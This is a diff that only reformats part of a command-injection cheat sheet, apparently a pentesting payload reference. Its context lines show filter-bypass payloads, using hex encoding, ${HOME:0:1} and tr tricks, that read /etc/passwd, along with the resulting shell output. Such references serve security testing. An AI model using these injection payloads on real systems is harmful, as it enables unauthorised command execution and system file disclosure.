@@ -111,8 +111,9 @@ something%0Acat%20/etc/passwd
 
 ### Bypass characters filter via hex encoding
 
-linux
-```
+Linux
+
+```powershell
 swissky@crashlab▸ ~ ▸ $ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 /etc/passwd
 
@@ -136,14 +137,13 @@ swissky@crashlab▸ ~ ▸ $ xxd -r -ps <(echo 2f6574632f706173737764)
 
 swissky@crashlab▸ ~ ▸ $ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 root:x:0:0:root:/root:/bin/bash
-
 ```
 
 ### Bypass characters filter
 
 Commands execution without backslash and slash - linux bash
 
-```
+```powershell
 swissky@crashlab▸ ~ ▸ $ echo ${HOME:0:1}
 /
 
@@ -158,7 +158,6 @@ swissky@crashlab▸ ~ ▸ $ tr '!-0' '"-1' <<< .
 
 swissky@crashlab▸ ~ ▸ $ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 root:x:0:0:root:/root:/bin/bash
-
 ```
 
 ### Bypass Blacklisted words
